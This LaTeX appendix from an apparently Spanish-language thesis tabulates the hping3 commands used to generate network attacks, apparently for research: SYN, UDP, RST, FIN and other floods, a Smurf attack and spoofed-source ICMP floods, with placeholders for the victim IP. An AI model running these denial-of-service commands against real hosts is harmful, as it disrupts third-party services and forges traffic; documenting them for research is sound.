% Appendix Template

\chapter{Comandos de Hping3 utilizados} % Main appendix title

\label{AppendixA} % Change X to a consecutive letter; for referencing this appendix elsewhere, use \ref{AppendixX}
Los comandos de Hping3 utilizados para la generación de los ataques son los que se muestran en la Tabla \ref{tabla:comandos_hping3}. Para mayor información, consultar en \parencite{hping3_man}.\\


\begin{table}[htbp]
	\centering
	\begin{tabular}{|l|l|}
		\hline
		\cellcolor[HTML]{EFEFEF}\textbf{Ataque}    & \cellcolor[HTML]{EFEFEF}\textbf{Comando}                                                                               \\ \hline
		TCP SYN flood      & 
	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -S -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
		UDP flood          & 
	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -{}-udp -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
		Smurf              & 
	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -{}-icmp -{}-flood -{}-spoof \textless{}IP host} \\ \texttt{víctima\textgreater \textless{}IP broadcast\textgreater  {[}-d tamaño del paquete{]}} \\ \texttt{{[} -{}-interval tiempo de espera entre envío de}\\ \texttt{paquetes{]}}\end{tabular} 
		\\ \hline
		TCP RESET flood    & 
	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -R -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
		TCP FIN flood      & 
	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -F -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater  {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
		TCP SYN FIN flood  & 
	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -SF -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
		TCP PUSH ACK flood & 
	\begin{tabular}[c]{@{}l@{}}\texttt{hping3 -PA -{}-flood {[}-p puerto destino{]} \textless{}IP} \\ \texttt{host víctima\textgreater  {[}-d tamaño del paquete{]}}\end{tabular}         \\ \hline
	\begin{tabular}[c]{@{}l@{}} ICMP flood con\\ dirección de origen\\ falsificada y dirección\\ de destino distinta a la\\ de difusión \end{tabular} & 
\begin{tabular}[c]{@{}l@{}}
\texttt{hping3 -{}-icmp -{}-flood \textless{}IP host víctima\textgreater {[}-a IP} \\ \texttt{de origen falsificada{]}}\end{tabular}         \\ \hline
	
	\end{tabular}
	\caption{Comandos Hping3 utilizados.}
	\label{tabla:comandos_hping3}
\end{table}